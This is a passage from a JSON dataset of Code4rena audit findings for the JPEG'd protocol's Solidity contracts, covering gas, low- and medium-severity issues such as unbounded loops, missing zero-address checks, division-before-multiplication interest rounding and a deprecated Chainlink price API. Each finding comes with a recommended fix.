      "content": "\nAcross the whole solution, the declared pragma is `^0.8.0`.\n\nUsing newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.\n\nThe advantages here are:\n\n*   **Low level inliner** (>= 0.8.2): Cheaper runtime gas (especially relevant when the contract has small functions).\n*   **Optimizer improvements in packed structs** (>= 0.8.3)\n*   **Custom errors** (>= 0.8.4): cheaper deployment cost and runtime cost. *Note*: the runtime cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n\nConsider upgrading pragma to at least 0.8.4:\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-32-upgrade-pragma-to-at-least-084",
      "tags": [],
      "finders": []
    },
    {
      "id": "4401",
      "title": "[L-07] A magical number should be documented and explained:",
      "impact": "LOW",
      "content": "<h2 id=\"l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead\" style=\"position:relative;\"><a href=\"#l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead\" aria-label=\"l 07 a magical number should be documented and explained 1e36 use a constant instead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] A magical number should be documented and explained: <code>1e36</code>. Use a constant instead</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">196</span><span class=\"mtk1\">:                </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">207</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">307</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">319</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">94</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">172</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">newAccRewardsPerShare</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">newRewards</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">totalStaked</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">179</span><span class=\"mtk1\">:            (</span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">userLastAccRewardPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">])) / </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>I suggest using <code>constant</code> variables as this would make the code more maintainable and readable while costing nothing gas-wise.</p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead",
      "tags": [],
      "finders": []
    },
    {
      "id": "4398",
      "title": "[L-04] Add a timelock and event to critical functions",
      "impact": "LOW",
      "content": "<h2 id=\"l-04-add-a-timelock-and-event-to-critical-functions\" style=\"position:relative;\"><a href=\"#l-04-add-a-timelock-and-event-to-critical-functions\" aria-label=\"l 04 add a timelock and event to critical functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Add a timelock and event to critical functions</h2>\n<p>It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate.</p>\n<p>Consider adding a timelock and event to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">vaults/yVault/strategies/StrategyPUSDConvex.sol:177:    function setPerformanceFee(Rate memory _performanceFee)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">vaults/NFTVault.sol:290:    function setOrganizationFeeRate(Rate memory _organizationFeeRate)</span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-04-add-a-timelock-and-event-to-critical-functions",
      "tags": [],
      "finders": []
    },
    {
      "id": "4397",
      "title": "[L-03] Unbounded loop on array can lead to DoS",
      "impact": "LOW",
      "content": "<h2 id=\"l-03-unbounded-loop-on-array-can-lead-to-dos\" style=\"position:relative;\"><a href=\"#l-03-unbounded-loop-on-array-can-lead-to-dos\" aria-label=\"l 03 unbounded loop on array can lead to dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Unbounded loop on array can lead to DoS</h2>\n<p>As this array can grow quite large, the transactionâ€™s gas cost could exceed the block gas limit and make it impossible to call this function at all (see <code>@audit</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_allocPoint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lpToken</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">( </span><span class=\"mtk3\">//@audit low: a push exist but there's no pop in the solution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAll</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">noContract</span><span class=\"mtk1\">(msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) { </span><span class=\"mtk3\">//@audit low: poolInfo is unbounded</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_updatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_withdrawReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">351</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Consider introducing a reasonable upper limit based on block gas limits and/or adding a <code>remove</code> method to remove elements in the array.</p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-03-unbounded-loop-on-array-can-lead-to-dos",
      "tags": [],
      "finders": []
    },
    {
      "id": "4396",
      "title": "[L-02] Immutable addresses should be 0-checked",
      "impact": "LOW",
      "content": "<h2 id=\"l-02-immutable-addresses-should-be-0-checked\" style=\"position:relative;\"><a href=\"#l-02-immutable-addresses-should-be-0-checked\" aria-label=\"l 02 immutable addresses should be 0 checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Immutable addresses should be 0-checked</h2>\n<p>Consider adding an <code>address(0)</code> check here (see <code>@audit</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">77</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Controller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">28</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">53</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit low: should be address(0)</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-02-immutable-addresses-should-be-0-checked",
      "tags": [],
      "finders": []
    },
    {
      "id": "4395",
      "title": "[L-01] Add constructor initializers",
      "impact": "LOW",
      "content": "<h2 id=\"l-01-add-constructor-initializers\" style=\"position:relative;\"><a href=\"#l-01-add-constructor-initializers\" aria-label=\"l 01 add constructor initializers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Add constructor initializers</h2>\n<p>As per <a href=\"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6\">OpenZeppelinâ€™s (OZ) recommendation</a>, â€œThe guidelines are now to make it impossible for <em>anyone</em> to run <code>initialize</code> on an implementation contract, by adding an empty constructor with the <code>initializer</code> modifier. So the implementation contract gets initialized automatically upon deployment.â€</p>\n<p>Note that this behaviour is also incorporated the <a href=\"https://wizard.openzeppelin.com/\">OZ Wizard</a> since the UUPS vulnerability discovery: â€œAdditionally, we modified the code generated by the <a href=\"https://wizard.openzeppelin.com/\">Wizard 19</a> to include a constructor that automatically initializes the implementation when deployed.â€</p>\n<p>Furthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">helpers</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CryptoPunksHelper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">punksAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">helpers</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EtherRocksHelper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocksAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">JPEGStaking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">21</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20Upgradeable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">66</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/NFTVault.sol:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">139</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">initialize</span><span class=\"mtk1\">(</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-01-add-constructor-initializers",
      "tags": [],
      "finders": []
    },
    {
      "id": "1926",
      "title": "[M-11] Division before Multiplication May Result In No Interest Being Accrued",
      "impact": "MEDIUM",
      "content": "_Submitted by AuditsAreUS, also found by minhquanym_\n\n[NFTVault.sol#L590-L595](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L590-L595)<br>\n\nThere is a division before multiplication bug in `NFTVault._calculateAdditionalInterest()` which may result in no interesting being accrued and will have significant rounding issues for tokens with small decimal places.\n\nThis issue occurs since an intermediate calculation of  `interestPerSec` may round to zero and therefore the multiplication by `elapsedTime` may remain zero.\n\nFurthermore, even if `interestPerSec > 0` there will still be rounding errors as a result of doing division before multiplication and `_calculatedInterest()` will be understated.\n\nThis issue is significant as one divisor is 365 days = 30,758,400 (excluding the rate). Since many ERC20 tokens such as USDC and USDT only have 6 decimal places a numerator of less 30 \\* 10^6 will round to zero.\n\nThe rate also multiplies into the denominator. e.g. If the rate is 1% then the denominator will be equivalent to `1 / rate * 30 * 10^6 = 3,000 * 10^6`.\n\n### Proof of Concept\n\nThe order of operations for the interest calculations\n\n*   `totalDebtAmount`\n*   MUL `settings.debtInterestApr.numerator`\n*   DIV `settings.debtInterestApr.denominator`\n*   DIV `365 days`\n*   MUL `elapsedTime`\n\nIf the intermediate value of `interestPerSec = 0` then the multiplication by `elapsedTime` will still be zero and no interested will be accrued.\n\nExcerpt from `NFTVault._calculateAdditionalInterest()`.\n\n            uint256 interestPerYear = (totalDebtAmount *\n                settings.debtInterestApr.numerator) /\n                settings.debtInterestApr.denominator;\n            uint256 interestPerSec = interestPerYear / 365 days;\n\n            return elapsedTime * interestPerSec;\n\n### Recommended Mitigation Steps\n\nThis issue may be resolved by performing the multiplication by `elapsedTime` before the division by the denominator or `365 days`.\n\n            uint256 interestAccrued = (elapsedTime * \n                totalDebtAmount *\n                settings.debtInterestApr.numerator) /\n                settings.debtInterestApr.denominator /\n                365 days;\n\n            return  interestAccrued;\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97):**\n > Fixed [jpegd/core#8](https://github.com/jpegd/core/pull/8). \n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97#issuecomment-1110008295):**\n > This report makes sense as a medium to me because it involves a calculation error that can lead to the protocol functioning incorrectly.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a division before multiplication bug in the code of NFTVault._calculateAdditionalInterest() which may result in no interesting being accrued and will have significant rounding issues for tokens with small decimal places. The issue occurs since an intermediate calculation of  interestPerSec may round to zero and therefore the multiplication by elapsedTime may remain zero. Furthermore, even if interestPerSec > 0 there will still be rounding errors as a result of doing division before multiplication and _calculatedInterest() will be understated. This issue is significant as one divisor is 365 days = 30,758,400 (excluding the rate). The rate also multiplies into the denominator, which can cause the numerator to round to zero.\n\nThe recommended mitigation steps for this issue are to perform the multiplication by elapsedTime before the division by the denominator or 365 days.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/97",
      "tags": [],
      "finders": [
        "AuditsAreUS",
        "minhquanym"
      ]
    },
    {
      "id": "1925",
      "title": "[M-10] Chainlink pricer is using a deprecated API",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by 0xDjango, 0xkatana, berndartmueller, Cr4ckM3, defsec, horsefacts, hyh, JMukesh, joshie, Jujic, pedroais, peritoflores, rayn, reassor, Ruhum, and WatchPug_\n\nAccording to Chainlink's documentation, the latestAnswer function is deprecated. This function might suddenly stop working if Chainlink stops supporting deprecated APIs. And the old API can return stale data.\n\n### Proof of Concept\n\n[FungibleAssetVaultForDAO.sol#L105](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L105)<br>\n[NFTVault.sol#L459](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L459)<br>\n\n### Recommended Mitigation Steps\n\nUse the latestRoundData function to get the price instead. Add checks on the return data with proper revert messages if the price is stale or the round is uncomplete.<br>\n<https://docs.chain.link/docs/price-feeds-api-reference/>\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/4)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/4#issuecomment-1099244659):**\n > Fixed in [jpegd/core#9](https://github.com/jpegd/core/pull/9).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of the FungibleAssetVaultForDAO.sol and NFTVault.sol contracts. The vulnerability is related to the use of the deprecated latestAnswer function, which might suddenly stop working if Chainlink stops supporting deprecated APIs and can return stale data. To mitigate this vulnerability, it is recommended to use the latestRoundData function to get the price instead and to add checks on the return data with proper revert messages if the price is stale or the round is incomplete.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/4",
      "tags": [],
      "finders": [
        "reassor",
        "JMukesh",
        "0xkatana",
        "cccz",
        "0xDjango",
        "Ruhum",
        "Jujic",
        "WatchPug",
        "berndartmueller",
        "pedroais",
        "peritoflores",
        "rayn",
        "joshie",
        "Cr4ckM3",
        "hyh",
        "horsefacts",
        "defsec"
      ]
    },
    {
      "id": "1924",
      "title": "[M-09] The noContract modifier does not work as expected.",
      "impact": "MEDIUM",
